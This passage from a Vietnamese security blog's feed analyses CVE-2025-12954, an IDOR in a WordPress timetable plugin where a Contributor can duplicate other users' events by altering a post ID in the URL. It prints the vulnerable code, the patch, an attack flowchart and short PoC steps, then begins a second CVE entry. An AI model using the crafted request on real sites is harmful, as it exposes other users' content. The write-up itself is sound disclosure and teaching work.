admin.&lt;/p&gt;&#xA;&lt;p&gt;Link chỉ hiển thị khi bài viết đúng &lt;code&gt;post_type&lt;/code&gt; và người dùng có quyền &lt;code&gt;edit_posts&lt;/code&gt; (Contributor+).&#xA;URL được tạo trỏ đến &lt;code&gt;post.php&lt;/code&gt; kèm &lt;code&gt;post&lt;/code&gt; (ID bài viết), &lt;code&gt;action&lt;/code&gt; (&lt;code&gt;mptt_duplicate_event&lt;/code&gt;) và &lt;code&gt;_wpnonce&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Khi người dùng click &lt;strong&gt;Duplicate&lt;/strong&gt;, WordPress sẽ kích hoạt hook &lt;code&gt;post_action_mptt_duplicate_event&lt;/code&gt; để xử lý việc nhân bản bài viết.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-21-cve-2025-12954/duplicate.png&#34; title=&#34;Link duplicate trong mỗi Event&#34; data-thumbnail=&#34;/posts/2025-12-21-cve-2025-12954/duplicate.png&#34; data-sub-html=&#34;&lt;h2&gt;Duplicate&lt;/h2&gt;&lt;p&gt;Link duplicate trong mỗi Event&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-21-cve-2025-12954/duplicate.png&#39; alt=&#34;Duplicate&#34; height=&#34;483&#34; width=&#34;875&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Link duplicate trong mỗi Event&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Callback &lt;code&gt;post_action_mptt_duplicate_event&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function post_action_mptt_duplicate_event( $post_id ) {&#xA;    global $wpdb;&#xA;&#xA;    $post_type = &amp;#39;&amp;#39;;&#xA;&#xA;    if ( $post_id ) {&#xA;        $post = get_post( $post_id );&#xA;    }&#xA;&#xA;    if ( $post ) {&#xA;        $post_type = $post-&amp;gt;post_type;&#xA;    }&#xA;&#xA;    if ( $post_type !== $this-&amp;gt;post_type ) {&#xA;        wp_die( __( &amp;#39;A post type mismatch has been detected.&amp;#39;, &amp;#39;mp-timetable&amp;#39; ), __( &amp;#39;Sorry, you are not allowed to edit this item.&amp;#39;, &amp;#39;mp-timetable&amp;#39; ), 400 );&#xA;    }&#xA;&#xA;    $nonce = sanitize_key( $_REQUEST[&amp;#39;_wpnonce&amp;#39;] );&#xA;&#xA;    if ( wp_verify_nonce( $nonce, &amp;#39;mptt_duplicate_event&amp;#39; ) &amp;amp;&amp;amp; current_user_can(&amp;#39;edit_posts&amp;#39;) ) {&#xA;&#xA;        $current_user = wp_get_current_user();&#xA;        $new_post_author = $current_user-&amp;gt;ID;&#xA;&#xA;        /*&#xA;            * new post data array&#xA;            */&#xA;        $args = array(&#xA;            &amp;#39;comment_status&amp;#39; =&amp;gt; $post-&amp;gt;comment_status,&#xA;            &amp;#39;ping_status&amp;#39;    =&amp;gt; $post-&amp;gt;ping_status,&#xA;            &amp;#39;post_author&amp;#39;    =&amp;gt; $new_post_author,&#xA;            &amp;#39;post_content&amp;#39;   =&amp;gt; $post-&amp;gt;post_content,&#xA;            &amp;#39;post_excerpt&amp;#39;   =&amp;gt; $post-&amp;gt;post_excerpt,&#xA;            &amp;#39;post_name&amp;#39;      =&amp;gt; $post-&amp;gt;post_name,&#xA;            &amp;#39;post_parent&amp;#39;    =&amp;gt; $post-&amp;gt;post_parent,&#xA;            &amp;#39;post_password&amp;#39;  =&amp;gt; $post-&amp;gt;post_password,&#xA;            &amp;#39;post_status&amp;#39;    =&amp;gt; &amp;#39;draft&amp;#39;,&#xA;            // translators: New post title of the duplicated post&#xA;            &amp;#39;post_title&amp;#39;     =&amp;gt; sprintf( __(&amp;#39;%s - Copy&amp;#39;, &amp;#39;mp-timetable&amp;#39;), $post-&amp;gt;post_title ),&#xA;            &amp;#39;post_type&amp;#39;      =&amp;gt; $post-&amp;gt;post_type,&#xA;            &amp;#39;to_ping&amp;#39;        =&amp;gt; $post-&amp;gt;to_ping,&#xA;            &amp;#39;menu_order&amp;#39;     =&amp;gt; $post-&amp;gt;menu_order&#xA;        );&#xA;&#xA;        /*&#xA;            * insert the post by wp_insert_post() function&#xA;            */&#xA;        $new_post_id = wp_insert_post( $args );&#xA;&#xA;        if( is_wp_error($new_post_id) ) {&#xA;            wp_die( $post_id-&amp;gt;get_error_message() );&#xA;        }&#xA;&#xA;        /*&#xA;            * get all current post terms and set them to the new post draft&#xA;            */&#xA;        $taxonomies = get_object_taxonomies($post-&amp;gt;post_type);&#xA;        foreach ($taxonomies as $taxonomy) {&#xA;            $post_terms = wp_get_object_terms($post_id, $taxonomy, array(&amp;#39;fields&amp;#39; =&amp;gt; &amp;#39;slugs&amp;#39;));&#xA;            wp_set_object_terms($new_post_id, $post_terms, $taxonomy, false);&#xA;        }&#xA;&#xA;        /*&#xA;            * duplicate all post meta&#xA;            */&#xA;        $post_meta_keys = \get_post_custom_keys( $post_id );&#xA;&#xA;        if ( ! empty( $post_meta_keys ) ) {&#xA;&#xA;            $meta_excludelist = [&#xA;                &amp;#39;_edit_lock&amp;#39;,&#xA;                &amp;#39;_edit_last&amp;#39;,&#xA;                &amp;#39;_wp_old_slug&amp;#39;&#xA;            ];&#xA;&#xA;            $meta_keys = \array_diff( $post_meta_keys, $meta_excludelist );&#xA;&#xA;            foreach ( $meta_keys as $meta_key ) {&#xA;                $meta_values = \get_post_custom_values( $meta_key, $post_id );&#xA;&#xA;                // Clear existing meta data&#xA;                \delete_post_meta( $new_post_id, $meta_key );&#xA;&#xA;                foreach ( $meta_values as $meta_value ) {&#xA;                    $meta_value = \maybe_unserialize( $meta_value );&#xA;                    \add_post_meta( $new_post_id, $meta_key, addslashes( $meta_value ) );&#xA;                }&#xA;            }&#xA;&#xA;        }&#xA;&#xA;        /*&#xA;            * duplicate timeslots in custom BD&#xA;            */&#xA;        $timeslots = $this-&amp;gt;wpdb-&amp;gt;get_results( &#xA;            $this-&amp;gt;wpdb-&amp;gt;prepare(&amp;#34;SELECT * FROM {$this-&amp;gt;table_name} WHERE event_id = %d&amp;#34;, $post_id ), &#xA;        OBJECT );&#xA;&#xA;        if ( !empty($timeslots) ) {&#xA;&#xA;            foreach ( $timeslots as $timeslot ) {&#xA;                $wpdb-&amp;gt;insert(&#xA;                    $this-&amp;gt;table_name,&#xA;                    array(&#xA;                        &amp;#39;column_id&amp;#39;   =&amp;gt; $timeslot-&amp;gt;column_id,&#xA;                        &amp;#39;event_id&amp;#39;    =&amp;gt; $new_post_id,&#xA;                        &amp;#39;event_start&amp;#39; =&amp;gt; date( &amp;#39;H:i&amp;#39;, strtotime( $timeslot-&amp;gt;event_start ) ),&#xA;                        &amp;#39;event_end&amp;#39;   =&amp;gt; date( &amp;#39;H:i&amp;#39;, strtotime( $timeslot-&amp;gt;event_end ) ),&#xA;                        &amp;#39;user_id&amp;#39;     =&amp;gt; $timeslot-&amp;gt;user_id,&#xA;                        &amp;#39;description&amp;#39; =&amp;gt; $timeslot-&amp;gt;description&#xA;                    )&#xA;                );&#xA;            }&#xA;        }&#xA;&#xA;        /*&#xA;            * redirect to the edit post screen for the new draft&#xA;            */&#xA;        wp_safe_redirect( get_edit_post_link( $new_post_id, &amp;#39;&amp;#39; ) );&#xA;        exit();&#xA;&#xA;    } else {&#xA;        wp_die( __( &amp;#39;Sorry, you are not allowed to edit this item.&amp;#39; ) );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm này thực hiện duplicate của post có post id là &lt;code&gt;$post_id&lt;/code&gt;, tuy nhiên:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( wp_verify_nonce( $nonce, &amp;#39;mptt_duplicate_event&amp;#39; ) &amp;amp;&amp;amp; current_user_can(&amp;#39;edit_posts&amp;#39;) ) {&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Đây là nguyên nhân chính dẫn tới IDOR (Insecure Direct Object Reference).&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;edit_posts&lt;/code&gt; là quyền &lt;strong&gt;chung&lt;/strong&gt;, không gắn với &lt;strong&gt;bài viết cụ thể&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Contributor trở lên đều có quyền này&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Không có kiểm tra:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;bài viết có thuộc user hiện tại không&lt;/li&gt;&#xA;&lt;li&gt;user có quyền chỉnh sửa &lt;strong&gt;post_id cụ thể&lt;/strong&gt; hay không&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;$post = get_post( $post_id );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bài viết được lấy trực tiếp từ &lt;code&gt;$post_id&lt;/code&gt; truyền qua URL mà &lt;strong&gt;không ràng buộc quyền sở hữu&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;post.php?action=mptt_duplicate_event&amp;amp;post=123&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Chỉ cần đoán hoặc thay đổi &lt;code&gt;post&lt;/code&gt; ID trong URL, người dùng có &lt;code&gt;edit_posts&lt;/code&gt; vẫn có thể:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;duplicate bài viết của người khác&lt;/li&gt;&#xA;&lt;li&gt;duplicate bài đã publish&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Vì WordPress &lt;strong&gt;không tự kiểm tra quyền ở hook &lt;code&gt;post_action_*&lt;/code&gt;&lt;/strong&gt;, toàn bộ việc kiểm soát truy cập phụ thuộc vào đoạn &lt;code&gt;current_user_can()&lt;/code&gt; trong plugin.&lt;/p&gt;&#xA;&lt;p&gt;Thay vì sử dụng &lt;code&gt;edit_posts&lt;/code&gt;, bản vá đã chuyển sang kiểm tra quyền trên từng đối tượng cụ thể bằng meta capability:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;current_user_can( &amp;#39;edit_post&amp;#39;, $post_id )&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Cách kiểm tra này buộc WordPress phải xác minh:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Người dùng có quyền chỉnh sửa bài viết được tham chiếu bởi &lt;code&gt;$post_id&lt;/code&gt; hay không&lt;/li&gt;&#xA;&lt;li&gt;Bài viết có thuộc về người dùng hiện tại không&lt;/li&gt;&#xA;&lt;li&gt;Trạng thái bài viết (draft, pending, published, private)&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Nhờ đó, người dùng không còn có thể tự ý thay đổi post ID trong URL để duplicate bài viết của người khác, và lỗ hổng &lt;strong&gt;IDOR&lt;/strong&gt; được khắc phục.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-21-cve-2025-12954/diff.png&#34; title=&#34;Sự thay đổi của bản vá&#34; data-thumbnail=&#34;/posts/2025-12-21-cve-2025-12954/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Sự thay đổi của bản vá&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-21-cve-2025-12954/diff.png&#39; alt=&#34;Diff&#34; height=&#34;679&#34; width=&#34;1788&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Sự thay đổi của bản vá&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;&#xA;A[&amp;#34;Authenticated user (Contributor&amp;#43;)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Click Duplicate link or craft URL manually&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;Request: /wp-admin/post.php?action=mptt_duplicate_event&amp;amp;post={target_post_id}&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;WordPress loads post.php&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;do_action(&amp;#39;post_action_mptt_duplicate_event&amp;#39;, post_id)&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;post_action_mptt_duplicate_event(post_id)&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;get_post(post_id) without ownership check&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;Check nonce &amp;#43; current_user_can(&amp;#39;edit_posts&amp;#39;)&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;Permission granted (generic capability)&amp;#34;]&#xA;I --&amp;gt; J[&amp;#34;Duplicate target post (content, meta, taxonomy, custom table)&amp;#34;]&#xA;J --&amp;gt; K[&amp;#34;Create new draft owned by attacker&amp;#34;]&#xA;K --&amp;gt; L[&amp;#34;Redirect to edit screen of duplicated post&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Login bằng Contributor account&lt;/li&gt;&#xA;&lt;li&gt;Truy cập &lt;code&gt;Timetable&lt;/code&gt; &amp;gt; &lt;code&gt;Events&lt;/code&gt; và click &lt;code&gt;Duplicate&lt;/code&gt; của event bất kỳ&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-21-cve-2025-12954/poc.gif&#34; title=&#34;PoC&#34; data-thumbnail=&#34;/posts/2025-12-21-cve-2025-12954/poc.gif&#34; data-sub-html=&#34;&lt;h2&gt;PoC&lt;/h2&gt;&lt;p&gt;PoC&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-21-cve-2025-12954/poc.gif&#39; alt=&#34;PoC&#34; height=&#34;644&#34; width=&#34;1916&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;PoC&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng xuất phát từ việc plugin chỉ kiểm tra quyền tổng quát &lt;code&gt;edit_posts&lt;/code&gt; khi duplicate event, thay vì kiểm tra quyền trên &lt;strong&gt;bài viết cụ thể&lt;/strong&gt;. Do hook &lt;code&gt;post_action_*&lt;/code&gt; không được WordPress tự động bảo vệ, người dùng có quyền thấp (Contributor) có thể thay đổi &lt;code&gt;post&lt;/code&gt; ID trong URL để duplicate event mà họ không sở hữu, dẫn tới IDOR. Bản vá khắc phục bằng cách sử dụng meta capability &lt;code&gt;edit_post&lt;/code&gt;, buộc WordPress xác minh quyền trên từng post.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;edit_posts&lt;/code&gt; không phù hợp để bảo vệ thao tác trên post cụ thể&lt;/li&gt;&#xA;&lt;li&gt;Nonce không thay thế cho kiểm tra quyền&lt;/li&gt;&#xA;&lt;li&gt;ID lấy từ request luôn là user-controlled&lt;/li&gt;&#xA;&lt;li&gt;Luôn dùng &lt;code&gt;current_user_can( &#39;edit_post&#39;, $post_id )&lt;/code&gt; khi thao tác trên post&lt;/li&gt;&#xA;&lt;li&gt;Hook &lt;code&gt;post_action_*&lt;/code&gt; yêu cầu plugin tự kiểm soát authorization&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/mp-timetable/vulnerability/wordpress-timetable-and-event-schedule-plugin-2-4-16-contributor-event-disclosure-via-idor-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Timetable and Event Schedule Plugin &amp;lt;= 2.4.15 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-67985 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-20-cve-2025-67985/</link>
      <pubDate>Sat, 20 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-20-cve-2025-67985/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-20-cve-2025-67985/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;bỏ qua kiểm soát phân quyền thông qua khóa do người dùng kiểm soát&lt;/strong&gt; trong plugin &lt;strong&gt;Document Library Lite&lt;/strong&gt; của &lt;strong&gt;Barn2 Plugins&lt;/strong&gt; cho phép khai thác &lt;strong&gt;các mức bảo mật kiểm soát truy cập được cấu hình không đúng&lt;/strong&gt;.&#xA;Lỗ hổng này ảnh hưởng đến &lt;strong&gt;Document Library Lite&lt;/strong&gt; từ &lt;strong&gt;không xác định&lt;/strong&gt; đến &lt;strong&gt;phiên bản 1.1.7 trở xuống&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-67985&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-67985&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure direct object references (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.1.7&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.2.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/document-library-lite/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Document Library Lite Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; 